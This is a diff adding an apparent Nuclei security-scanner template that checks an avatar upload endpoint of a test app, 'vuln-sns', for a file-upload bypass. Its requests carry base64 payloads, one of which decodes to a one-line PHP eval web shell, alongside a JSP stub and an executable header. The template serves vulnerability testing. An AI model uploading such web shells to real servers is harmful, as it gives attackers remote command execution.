@@ -1,0 +1,87 @@
+id: vuln-sns-profile-file-upload-bypass
+
+info:
+  name: vuln-sns Profile File Upload Bypass
+  author: devin
+  severity: high
+  description: File upload restrictions bypass in avatar upload endpoint
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 8.8
+    cwe-id: CWE-434
+  metadata:
+    max-request: 3
+  tags: file-upload,bypass,profile,vuln-sns,authenticated
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/profile/avatar"
+    
+    headers:
+      Content-Type: application/json
+      Authorization: "Bearer alice_token"
+    
+    body: |
+      {
+        "file_id": "malicious.php",
+        "image_data": "PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4="
+      }
+    
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+      
+      - type: word
+        words:
+          - "success"
+          - "uploaded"
+          - "saved"
+        condition: or
+        part: body
+        case-insensitive: true
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/profile/avatar"
+    
+    headers:
+      Content-Type: application/json
+      Authorization: "Bearer alice_token"
+    
+    body: |
+      {
+        "file_id": "shell.jsp",
+        "image_data": "PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLmlvLioiICU+"
+      }
+    
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/profile/avatar"
+    
+    headers:
+      Content-Type: application/json
+      Authorization: "Bearer alice_token"
+    
+    body: |
+      {
+        "file_id": "test.exe",
+        "image_data": "TVqQAAMAAAAEAAAA"
+      }
+    
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
